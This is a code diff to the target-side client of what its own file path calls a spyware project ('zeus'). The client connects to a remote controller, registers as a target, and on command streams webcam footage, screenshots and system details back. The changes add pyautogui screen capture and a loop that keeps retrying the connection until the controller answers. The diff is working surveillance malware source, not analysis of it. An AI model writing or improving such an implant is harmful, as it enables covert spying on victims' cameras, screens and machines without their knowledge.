@@ -15,6 +15,7 @@ import mss
 import json
 from PIL import Image
 from io import BytesIO
+import pyautogui
 
 with open('D:\\Workspace\\Code\Spyware\\zeus\\Target\\settings.json', 'r') as f:
     data = json.load(f)
@@ -122,7 +123,13 @@ def System_information():
 
 print('[CONNECTION] Attempting to connect to the server.')
 
-s.connect((IP,PORT))
+
+while True:
+    try:
+        s.connect((IP,PORT))
+        break
+    except ConnectionRefusedError:
+        continue
 
 
 s.send(bytes(f'TARGET|{NAME}|{ID}','utf-8'))
@@ -136,8 +143,7 @@ while True:
         command = s.recv(300).decode('utf-8')
     except ConnectionResetError:
         print("Error: Server offline.")
-        while True:
-            pass
+        break
 
     if command == 'GET_CAMERA_FOOTAGE':
         vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
@@ -168,15 +174,16 @@ while True:
     elif command == 'GET_SCREEN_CAPTURE':
         print('[COMMAND] Sending screen capture.')
 
-        screen = mss.mss()
-        monitor = screen.monitors[0]
+        #screen = mss.mss()
+        #monitor = screen.monitors[0]
 
         while True:
-            ss = screen.grab(monitor)
+            #ss = screen.grab(monitor)
+            ss = pyautogui.screenshot()
 
             image_buffer = BytesIO()
-            img = Image.frombytes("RGB", ss.size, ss.rgb)
-            img.save(image_buffer, format="JPEG", quality=50)
+            #img = Image.frombytes("RGB", ss.size, ss.rgb)
+            ss.save(image_buffer, format="JPEG", quality=50)
 
             ss_pkld = pickle.dumps(image_buffer)
 
@@ -311,3 +318,5 @@ while True:
         time.sleep(1)
 
         s.sendall(details)
+
+print("QUIT")
